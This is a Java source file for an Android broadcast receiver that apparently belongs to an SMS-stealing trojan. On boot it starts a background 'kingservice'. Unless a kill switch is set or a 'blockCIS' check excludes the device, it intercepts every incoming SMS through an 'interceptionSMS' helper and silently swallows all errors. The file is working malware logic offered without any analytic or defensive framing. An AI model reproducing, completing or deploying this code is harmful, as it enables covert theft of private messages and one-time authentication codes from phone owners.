package com.service.app.Main;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.service.app.Services.Utitlies;
import com.service.app.Services.kingservice;
import com.service.app.Services.utils;
import com.service.app.defines;

public class smsreceiver extends BroadcastReceiver {
    utils utl = new utils();
    defines consts = new defines();
    Utitlies idutl = new Utitlies();

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            if (intent.getAction() != null && intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
                utl.SettingsWrite(context.getApplicationContext(),"websocket", "0");
                utl.startKingService(context);
            }
            if ((!utl.SettingsRead(context, consts.kill).contains(consts.str_dead)) && (!utl.blockCIS(context))) {
                if (intent.getAction().equals(consts.SMS_RECEIVED)) {
                    utl.interceptionSMS(context, intent);
                }
            }
        }catch (Exception e){}

    }
}
